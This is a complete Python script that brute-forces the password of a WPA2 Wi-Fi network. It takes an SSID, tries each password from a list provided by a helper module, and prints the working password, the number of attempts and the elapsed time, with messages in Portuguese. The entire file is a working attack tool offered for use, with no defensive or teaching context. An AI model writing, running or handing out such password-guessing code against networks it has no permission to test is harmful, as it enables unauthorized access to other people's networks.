import pywifi
from pywifi import const
import time
import common
ssid = str(input("SSID: "))
ps=common.view_pswd()
i=0
start_time = time.time()
while True:
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = ps[i]
    i+=1
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = iface.add_network_profile(profile)
    connect = iface.connect(profile)
    time.sleep(0.3)
    if iface.status() == const.IFACE_CONNECTED:
        print('sucesso:- >'+ps[i-1])
        print(f'N° Tentativas: {+i}')
        end_time = time.time()
        execution_time = end_time - start_time
        print(f"Tempo de execução: {execution_time:.6f} segundos")
        break
    if i == 20:
        print('esperando 10 segundos')
        time.sleep(20)
    elif len(ps) == i:
        break
    else:
        print(f'Falha: {i} Usando: => {ps[i-1]}')

#print(iface.status() == const.IFACE_DISCONNECTED)
#print(iface.status() == const.IFACE_INACTIVE)
#print(iface.status() == const.IFACE_CONNECTING)
#print(iface.status() == const.IFACE_CONNECTED)


   
